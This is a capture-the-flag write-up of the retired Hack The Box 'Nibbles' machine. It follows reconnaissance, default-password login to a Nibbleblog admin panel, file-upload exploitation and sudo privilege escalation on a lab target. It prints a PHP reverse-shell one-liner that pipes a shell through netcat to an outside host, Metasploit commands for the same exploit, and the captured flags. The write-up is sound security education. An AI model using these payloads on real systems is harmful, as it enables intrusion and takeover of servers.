---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Nibbles (Easy)

## <mark style="color:blue;">Description</mark>

* **Difficult** <mark style="color:green;">**->**</mark> Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **State** <mark style="color:green;">-></mark> Retired
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Vulnerability Assessment / Web Application / Security Tools / Software & OS Exploitation\
  Remote Code Execution / Default Credentials

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/machines/121/information">https://app.hackthebox.com/machines/121/</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started making an initial port scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

{% code lineNumbers="true" %}
```bash
nmap 10.129.93.176 -p- -Pn --min-rate 2500 -oN scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>

***

* Then I did an exhaustive scan to learn about the services running on the open ports

{% code lineNumbers="true" %}
```bash
nmap 10.129.93.176 -p22,80 -sVC -oN serv_scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (777).png" alt=""><figcaption></figcaption></figure>

***

* I found the HTTP protocol running on port 80, so I went to check in the browser the content being deployed. All that I saw was a page with a message, so I reviewed the source code to find out more information

<figure><img src="../../.gitbook/assets/image (778).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
{% endhint %}

***

* There I found a comment that let me know there was another page in the route _/nibbleblog_ so I navigated there and found a page with a blog style that I could explore

<figure><img src="../../.gitbook/assets/image (780).png" alt=""><figcaption></figcaption></figure>

***

* After exploring the page, I didn't find anything relevant, the only hint the site gave me was letting me know the site was powered by the _nibbleblog_ CMS. So, in an attempt to find out possible hidden directories or routes, I fuzzed the route with the help of [_gobuster_](../../web-exploitation/tools-and-utilities.md#gobuster) and a dictionary from [_Seclists_](../../web-exploitation/tools-and-utilities.md#daniel-miessler-wordlists)

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.129.93.176/nibbleblog -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -o fuzz.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

***

* I found some interesting routes, being the most relevant the _/admin.php_ route, so I navigated there and found a simple login page. I tried using common credentials to log in but it didn't work

<figure><img src="../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>

***

* I needed a username and a password I could log in with, so I went back and checked other found routes looking for this information. I noticed there was a _/content_ route, so I went there to explore it

<figure><img src="../../.gitbook/assets/image (783).png" alt=""><figcaption></figcaption></figure>

***

* There I found some exposed folders, so I explored the files that were contained there. After examining them I found an interesting file on _/content/private/users.xml_ and accessed it, and noticed this _XML_ document was leaking some information

<figure><img src="../../.gitbook/assets/image (784).png" alt=""><figcaption></figcaption></figure>

***

* That let me know there was an existing username named _admin_ but it didn't give me any information about a related password, so I kept searching through the files. Then I went to check the &#x63;_&#x6F;nfig.xml_ file and noticed the particular use of the _nibbles_ word many times

<figure><img src="../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>

***

* Even the domain of an email was using this word there, so that could mean that was the enterprise name and turned it into a possible option for a weak password. I tried to log in on the _/admin.php_ page using _admin_ as username and _nibbles_ as password and it let me in successfully to a new dashboard

<figure><img src="../../.gitbook/assets/image (786).png" alt=""><figcaption></figcaption></figure>

***

* After that, I explored the sections of the page searching for any possible vulnerability. As I didn't find anything at first sight, I searched if there were any possible CVEs for this CMS. After a little research, I found a [repository ](https://github.com/dix0nym/CVE-2015-6967)with an exploit for the _CVE-2015-6967_ related to the CMS. That would let me abuse a File Upload vulnerability to gain a reverse shell but I needed to find first a point for uploading a file

<figure><img src="../../.gitbook/assets/image (788).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about File Upload exploitation you can go [here](../../web-exploitation/broken-access-control/abuse-file-upload.md)
{% endhint %}

***

* So I kept looking for an option that could let me upload a file to the system and abuse the vulnerability. After a while, I found there was a _Plugins_ section that could be interesting because sometimes a plugin can be added from external sources, so I accessed it

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

***

* There I found some already installed plugins and after exploring them, the _My Image_ plugin caught my attention because it had an option to upload a picture file, a point that I could abuse

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

***

* To do so, I could create a script for getting a Reverse Shell and upload it into this section. Also, I confirmed that the page is based on _PHP_ with the help of [_Wappalyazer_](../../web-exploitation/tools-and-utilities.md#wappalyzer), so I created a basic script in this programming language with the payload and uploaded it

{% code title="RevShell.php" overflow="wrap" lineNumbers="true" %}
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.80 4444 >/tmp/f"); ?>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about how to create a script for a Reverse Shell you can go [here](../../scripting/reverse-shell.md)
{% endhint %}

***

* I saw a couple of warnings but the page told me that the file had been uploaded successfully. Then, I had to find out the location where the files were uploaded to execute it. I went back to search and after a while, I found under the _/content/private_ folder, a folder named _plugins._ Going there I found another folder related to the _My Image_ plugin so I went there to check its content&#x20;

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

***

* Unfortunately, I found a _PHP_ file named _image.php_ but wasn't the one I had uploaded. Maybe the name had been changed automatically inside the web service, so I tried assuming this only file was the one with my payload for the reverse shell. To confirm this, I created a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener in my machine on the same port specified in the script and then accessed the file

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp 4444
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

***

* I observed the page kept loading and checking the listener I noticed I had successfully caught the shell from the web. Then, I sanitized the terminal and checked which user I was, using the `whoami` command and with this I knew I was the _nibbler_ user

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn about the sanitization process you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
{% endhint %}

***

* Then I navigated to the _/home_ folder where I found a folder for this user and inside it, a _user.txt_ file from which I got the user flag

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the user flag

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

> Answer: _**0ac28aeb5d1e8d1808cdd083961381ad**_

***

* After that, I had to search for a way to escalate privileges. I checked the `sudo` execution permissions that the user had, and it was able to execute a _monitor.sh_ file. But after searching in the filesystem, I didn't find the file

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

***

* Looking again at the contents of the _/home/nibbler_ folder, I noticed a suspicious Zip file, so I decompressed it and checked its contents, which gave me the _monitor.sh_ file I was looking for

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

***

* Knowing this, I tried modifying the content of the script to spawn a shell. I replaced it and checked it had been saved correctly, which the system let me do without issues. Then I ran the script using `sudo` and gained the shell as the _root_ user

{% code lineNumbers="true" %}
```bash
echo '/bin/bash' > monitor.sh
sudo /monitor.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

***

* Finally, I navigated to the _/root_ folder where I found a _root.txt_ file, and reading its content I got the root flag

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**817daf6a75543a65762c919ecc5bcb94**_

## <mark style="color:blue;">Alternative using Metasploit</mark>

* Instead of searching through the web, I could check for known vulnerabilities using [_Metasploit_](../../penetration-testing/process-stages/exploitation/tools-and-utilities.md#metasploit). First, I started it and searched for vulnerabilities related to _nibbleblog_

{% code overflow="wrap" lineNumbers="true" %}
```bash
msfconsole
msf6 > search nibbleblog
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

***

* I found an exploit for a File Upload vulnerability existed, so I entered the context of this exploit and found out what parameters I needed to execute it

{% code overflow="wrap" lineNumbers="true" %}
```bash
msf6 > use exploit/multi/http/nibbleblog_file_upload
msf6 exploit(multi/http/nibbleblog_file_upload) > show options
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>

***

* I provide the asked parameters and run the script

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 10.10.14.80
msf6 exploit(multi/http/nibbleblog_file_upload) > set LPORT 4444
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.93.176
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

***

* After a while, I observed a _meterpreter_ session was spawned, and with this, I gained a shell for the user _nibbler_. With this, I could continue with the rest of the process

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
